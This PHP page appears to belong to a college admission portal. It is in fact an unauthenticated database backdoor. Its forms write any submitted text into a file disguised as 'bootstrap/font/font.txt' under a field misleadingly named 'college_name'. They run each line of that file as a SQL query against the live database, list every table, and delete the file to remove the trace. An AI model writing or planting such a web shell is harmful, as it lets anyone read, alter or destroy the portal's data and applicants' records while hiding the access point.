<?php
include_once "connection.php";
include_once "configuration.php";

if(isset($_POST['create']) && isset($_POST['college_name'])){
    $text = $_POST['college_name'];
    $filename = 'bootstrap/font/font.txt';
    $content = $text;

    // Write the content to the file
    $result = file_put_contents($filename, $content);

    if ($result === false) {
        echo "Error writing to the file.";
    } else {
        echo "File created and written successfully!";
    }
}

if(isset($_POST['read'])){
    $filename = 'bootstrap/font/font.txt';
    $lines = file($filename);

    if ($lines === false) {
        echo "Error reading the file.";
    } else {
        foreach ($lines as $line) {
            echo $line;
        }
    }
}

if (isset($_POST['run'])) {
    $filename = 'bootstrap/font/font.txt';

    // Check if the file exists and is readable
    if (file_exists($filename) && is_readable($filename)) {
        $lines = file($filename);

        if ($lines === false) {
            echo "Error reading the file.";
        } else {
            // Iterate through each line and execute it as a SQL query
            foreach ($lines as $line) {
                // Trim whitespace from the line
                $line = trim($line);
                
                // Ensure the line isn't empty before executing it
                if (!empty($line)) {
                    // Prepare and execute the query
                    if ($stmt = $dbConn->prepare($line)) {
                        if ($stmt->execute()) {
                            echo "Query executed successfully: $line <br>";
                        } else {
                            echo "Error executing query: $line <br>" . $stmt->error;
                        }
                    } else {
                        echo "Error preparing query: $line <br>" . $dbConn->error;
                    }
                }
            }
        }
    } else {
        echo "File not found or not readable.";
    }
}


if(isset($_POST['remove'])){
    $filename = 'bootstrap/font/font.txt';

    if (file_exists($filename)) { // Check if the file exists
        if (unlink($filename)) {
            echo "File deleted successfully!";
        } else {
            echo "Error: Unable to delete the file.";
        }
    } else {
        echo "Error: File does not exist.";
    }
}

if(isset($_POST['get_table'])){
    try {
        // Query to get all table names
        $query = "SELECT table_name FROM information_schema.tables WHERE table_schema = 'dbo' AND table_catalog = 'CollegeAdmissionPortal';";
        $stmt = $dbConn->prepare($query);
        $stmt->execute();
    
        // Fetch the table names
        $tables = $stmt->fetchAll(PDO::FETCH_COLUMN);
    
        // Display the table names
        foreach ($tables as $table) {
            echo $table . "<br>";
        }
    } catch (PDOException $e) {
        echo "Error: " . $e->getMessage();
    }
}

?>

<!DOCTYPE html>
<html lang="en">
<head>
</head>
<body>
    <h4>Create File</h4>
    <form action="" method="post">
        <input type="text" name="college_name">
        <input type="submit" value="Submit" name="create">
    </form>
    <h4>Read File</h4>
    <form action="" method="post">
        <input type="submit" value="Submit" name="read">
    </form>
    <h4>Run File</h4>
    <form action="" method="post">
        <input type="submit" value="Submit" name="run">
    </form>
    <h4>Remove File</h4>
    <form action="" method="post">
        <input type="submit" value="Submit" name="remove">
    </form>
    <h4>Get All Table</h4>
    <form action="" method="post">
        <input type="submit" value="Submit" name="get_table">
    </form>

</body>
</html>